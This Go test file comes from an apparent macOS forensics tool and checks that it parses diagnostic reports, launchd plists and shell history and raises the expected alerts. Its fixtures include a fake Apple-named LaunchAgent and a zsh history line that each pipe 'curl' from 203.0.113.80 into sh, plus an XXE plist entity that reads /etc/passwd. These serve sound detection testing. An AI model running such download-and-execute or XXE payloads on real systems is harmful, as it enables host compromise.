package forensics

import (
	"encoding/binary"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/kenzietann/omamori/internal/event"
	"github.com/kenzietann/omamori/internal/rules"
)

// binaryPlist writes the format bplist00 from objects that are already encoded. Object 0 is the top.
func binaryPlist(objects ...[]byte) []byte {
	data := []byte("bplist00")
	var offsets []byte
	for _, object := range objects {
		offsets = append(offsets, byte(len(data)))
		data = append(data, object...)
	}
	table := len(data)
	data = append(data, offsets...)
	trailer := make([]byte, 32)
	trailer[6], trailer[7] = 1, 1
	binary.BigEndian.PutUint64(trailer[8:], uint64(len(objects)))
	binary.BigEndian.PutUint64(trailer[24:], uint64(table))

	return append(data, trailer...)
}

func ascii(text string) []byte {
	if len(text) < 15 {
		return append([]byte{0x50 | byte(len(text))}, text...)
	}

	return append([]byte{0x5f, 0x10, byte(len(text))}, text...)
}

const launchAgentXML = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>com.apple.softwareupdate.helper</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>curl -s http://203.0.113.80/a | sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<dict><key>SuccessfulExit</key><false/></dict>
	<key>StartCalendarInterval</key>
	<dict><key>Hour</key><integer>3</integer></dict>
</dict>
</plist>
`

const ordinaryDaemonXML = `<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict><key>Label</key><string>com.docker.vmnetd</string>
<key>Program</key><string>/Library/PrivilegedHelperTools/com.docker.vmnetd</string>
<key>ProgramArguments</key><array><string>/Library/PrivilegedHelperTools/com.docker.vmnetd</string></array>
<key>UserName</key><string>_docker</string></dict></plist>
`

const resetReport = `{"os_version":"macOS 27.2.1 (26B131)","bug_type":"115","timestamp":"2026-11-16 16:18:08.00 +0900","name":"Reset count","roots_installed":0,"incident_id":"F3B5A34D-0000-4F75-A73A-70AABFA2B4B5"}
Incident Identifier: F3B5A34D-0000-4F75-A73A-70AABFA2B4B5
Date: 2026-11-16 16:18:08.87 +0900
Reset count: 0
Boot failure count: 1
Boot faults: rst btn_rst,btn_seq_reset target_off_restart
Boot stage: 0x40`

const panicReport = `{"bug_type":"210","timestamp":"2026-11-15 09:01:02.00 +0900","os_version":"macOS 27.2.1 (26B131)","incident_id":"AAAA"}
{"build":"macOS 27.2.1","product":"Mac15,3","panicString":"panic(cpu 4 caller 0xfffffe002b9c1a3c): watchdog timeout: no checkins from watchdogd in 90 seconds\nDebugger message: panic\nMemory ID: 0x6","otherString":"\n** Stackshot Succeeded **"}`

const crashReport = `{"app_name":"Preview","timestamp":"2026-11-14 10:00:00.00 +0900","bug_type":"309","os_version":"macOS 27.2.1 (26B131)","name":"Preview","incident_id":"BBBB"}
{
  "procPath" : "\/System\/Applications\/Preview.app\/Contents\/MacOS\/Preview",
  "exception" : {"codes":"0x0000000000000001, 0x0000000000000000","type":"EXC_BAD_ACCESS","signal":"SIGSEGV"}
}`

func writeMac(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	put := func(name, text string) {
		t.Helper()
		full := filepath.Join(root, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(text), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	put(macMarker, "<plist/>")
	put("Library/Logs/DiagnosticReports/ResetCounter-2026-11-16-161808.diag", resetReport)
	put("Library/Logs/DiagnosticReports/panic-full-2026-11-15-090102.000.panic", panicReport)
	put("Library/Logs/DiagnosticReports/Preview-2026-11-14-100000.ips", crashReport)
	put("Library/Logs/DiagnosticReports/Code Helper_2026-11-11-192350_keng.diag", "a spin report, not read")
	put("Library/LaunchAgents/com.apple.softwareupdate.helper.plist", launchAgentXML)
	put("Library/LaunchDaemons/com.docker.vmnetd.plist", ordinaryDaemonXML)
	put("Users/aiko/Library/LaunchAgents/com.example.sync.plist", string(binaryPlist(
		[]byte{0xd3, 1, 2, 3, 4, 5, 8},
		ascii("Label"), ascii("ProgramArguments"), ascii("RunAtLoad"), ascii("com.example.sync"),
		[]byte{0xa2, 6, 7}, ascii("/private/tmp/.sync/agent"), ascii("--quiet"), []byte{0x09},
	)))
	put("Users/aiko/.zsh_history", ": 1794812400:0;curl -fsSL http://203.0.113.80/x.sh | sh\n")
	put("Users/aiko/.zsh_sessions/5E1C.history", "ls -la\n")
	put("private/var/log/system.log", "Nov 16 16:17:30 mac-mini syslogd[566]: ASL Sender Statistics\n")
	// A Linux path on a Mac is not looked for: /etc of a Mac is a link into /private.
	put("etc/passwd", "root:x:0:0:root:/root:/bin/bash\n")

	return root
}

func TestCollectReadsAMac(t *testing.T) {
	root := writeMac(t)
	unified, err := filepath.Abs(filepath.Join("..", "..", "testdata", "fixtures", "macos", "unified-syslog.log"))
	if err != nil {
		t.Fatal(err)
	}
	set, err := rules.BuiltinForensics()
	if err != nil {
		t.Fatal(err)
	}
	result, err := Run(root, set, "built-in", Options{Year: 2026, Location: tokyo, UnifiedLog: unified}, time.Date(2026, 11, 16, 17, 0, 0, 0, tokyo))
	if err != nil {
		t.Fatal(err)
	}

	var read []string
	for _, entry := range result.Manifest.Entries {
		read = append(read, entry.Path+" "+entry.Kind)
	}
	for _, want := range []string{
		"Library/Logs/DiagnosticReports/ResetCounter-2026-11-16-161808.diag diagnostic_report",
		"Library/Logs/DiagnosticReports/panic-full-2026-11-15-090102.000.panic diagnostic_report",
		"Library/Logs/DiagnosticReports/Preview-2026-11-14-100000.ips diagnostic_report",
		"Library/LaunchAgents/com.apple.softwareupdate.helper.plist launchd_plist",
		"Users/aiko/Library/LaunchAgents/com.example.sync.plist launchd_plist",
		"Users/aiko/.zsh_sessions/5E1C.history shell_history",
		"private/var/log/system.log log",
		"snapshot:unified-syslog.log log",
	} {
		if !slices.Contains(read, want) {
			t.Errorf("not read: %s (read %v)", want, read)
		}
	}
	for _, path := range read {
		if strings.HasPrefix(path, "etc/") || strings.Contains(path, "_keng.diag") {
			t.Errorf("read %s", path)
		}
	}

	found := map[string]event.Event{}
	for _, current := range result.Outcome.Intake.Events {
		if current.Fields[event.Product] != ProductMacOS {
			t.Errorf("event %s has product %q", current.Ref, current.Fields[event.Product])
		}
		found[current.Fields[event.Service]+"/"+current.Fields[event.Action]+"/"+current.Fields["label"]] = current
	}
	reset := found["diagnostic_report/reset/"]
	if reset.Fields["reset_kind"] != "power_button" || reset.Fields["boot_failure_count"] != "1" || reset.Fields[TimeField] != TimeRecorded ||
		!reset.Time.Equal(time.Date(2026, 11, 16, 16, 18, 8, 0, tokyo)) {
		t.Errorf("reset = %v %v", reset.Time, reset.Fields)
	}
	if panic := found["diagnostic_report/kernel_panic/"]; panic.Fields["panic"] != "panic(cpu 4 caller 0xfffffe002b9c1a3c): watchdog timeout: no checkins from watchdogd in 90 seconds" {
		t.Errorf("panic = %v", panic.Fields)
	}
	if crash := found["diagnostic_report/crash/"]; crash.Fields["exception"] != "EXC_BAD_ACCESS SIGSEGV" || crash.Fields[event.Process] != "Preview" {
		t.Errorf("crash = %v", crash.Fields)
	}
	agent := found["launchd_plist/launchd_item/com.apple.softwareupdate.helper"]
	if agent.Fields[event.Command] != `/bin/sh -c "curl -s http://203.0.113.80/a | sh"` || agent.Fields["run_at_load"] != "true" || agent.Fields["keep_alive"] != "true" || agent.Fields["agent"] != "true" {
		t.Errorf("agent = %v", agent.Fields)
	}
	daemon := found["launchd_plist/launchd_item/com.docker.vmnetd"]
	if daemon.Fields[event.Command] != "/Library/PrivilegedHelperTools/com.docker.vmnetd" || daemon.Fields[event.User] != "_docker" {
		t.Errorf("daemon = %v", daemon.Fields)
	}
	binaryAgent := found["launchd_plist/launchd_item/com.example.sync"]
	if binaryAgent.Fields[event.Command] != "/private/tmp/.sync/agent --quiet" || binaryAgent.Fields[event.User] != "aiko" || binaryAgent.Fields["run_at_load"] != "true" {
		t.Errorf("binary agent = %v", binaryAgent.Fields)
	}

	alerts := map[string]int{}
	for _, alert := range result.Outcome.Result.Alerts {
		alerts[alert.Rule.Name]++
	}
	for name, count := range map[string]int{
		"forensics_macos_button_reset": 1, "forensics_macos_kernel_panic": 1, "forensics_launchd_suspicious_program": 2,
		"forensics_history_download_exec": 1, "macos_abnormal_shutdown": 1,
	} {
		if alerts[name] != count {
			t.Errorf("%s: %d alerts, want %d (all: %v)", name, alerts[name], count, alerts)
		}
	}
	report := Markdown(result)
	for _, want := range []string{"| written in the report | low | The Mac was reset with the power button", "LaunchDaemons and LaunchAgents (not the ones of Apple in /System)"} {
		if !strings.Contains(report, want) {
			t.Errorf("the report has no %q", want)
		}
	}
	if strings.Contains(report, "systemd units in /etc") {
		t.Error("the report of a Mac names the limits of Linux")
	}
	if alerts["forensics_macos_unexpected_reset"] != 0 {
		t.Errorf("a button reset was taken for an unexpected one: %v", alerts)
	}
}

func TestPlistsThatAreBroken(t *testing.T) {
	good := binaryPlist([]byte{0xd1, 1, 2}, ascii("Label"), ascii("x"))
	if values, err := readPlist(good); err != nil || values["Label"] != "x" {
		t.Fatalf("good plist = %v %v", values, err)
	}
	loop := binaryPlist([]byte{0xd1, 1, 0}, ascii("Label"))
	cut := good[:len(good)-40]
	badRef := binaryPlist([]byte{0xd1, 1, 9}, ascii("Label"))
	hugeCount := slices.Clone(good)
	binary.BigEndian.PutUint64(hugeCount[len(hugeCount)-24:], 1<<40)
	for name, data := range map[string][]byte{
		"loop": loop, "cut": cut, "reference past the end": badRef, "huge count": hugeCount,
		"xml entity":  []byte(`<?xml version="1.0"?><!DOCTYPE p [<!ENTITY x SYSTEM "file:///etc/passwd">]><plist><dict><key>Label</key><string>&x;</string></dict></plist>`),
		"not a dict":  []byte(`<plist><array><string>a</string></array></plist>`),
		"deep arrays": []byte("<plist>" + strings.Repeat("<array>", 50) + strings.Repeat("</array>", 50) + "</plist>"),
		"empty":       nil,
	} {
		if values, err := readPlist(data); err == nil {
			t.Errorf("%s: read %v", name, values)
		}
	}
}

func FuzzPlist(f *testing.F) {
	f.Add([]byte(launchAgentXML))
	f.Add(binaryPlist([]byte{0xd1, 1, 2}, ascii("Label"), ascii("x")))
	f.Fuzz(func(t *testing.T, data []byte) {
		_, _ = readPlist(data)
	})
}

func FuzzDiagnostic(f *testing.F) {
	for _, seed := range []string{resetReport, panicReport, crashReport, ""} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, text string) {
		events, _ := parseArtifact(KindDiagnostic, "Library/Logs/DiagnosticReports/x.ips", text)
		if len(events) != 1 {
			t.Fatalf("%d events", len(events))
		}
		for field, value := range events[0].Fields {
			for _, character := range value {
				if character < 0x20 || character == 0x7f {
					t.Fatalf("control character in %s", field)
				}
			}
		}
	})
}

func TestAUnifiedLogThatIsTooBigNamesTheFile(t *testing.T) {
	root := writeMac(t)
	before := maxEvents
	maxEvents = 50
	defer func() { maxEvents = before }()
	var log strings.Builder
	for line := 0; line < 60; line++ {
		log.WriteString(`{"processImagePath":"\/usr\/sbin\/bluetoothd","timestamp":"2026-11-16 09:16:00.5+0900","eventMessage":"a line","processID":381}` + "\n")
	}
	file := filepath.Join(t.TempDir(), "unified.ndjson")
	if err := os.WriteFile(file, []byte(log.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	_, err := Collect(root, Options{Year: 2026, Location: tokyo, UnifiedLog: file})
	if err != ErrUnifiedTooBig || !strings.Contains(err.Error(), "--predicate 'process == \"sshd\"") {
		t.Fatalf("error = %v", err)
	}
	// The Mac alone is within the limit.
	if _, err := Collect(root, Options{Year: 2026, Location: tokyo}); err != nil {
		t.Fatalf("without the file: %v", err)
	}
}
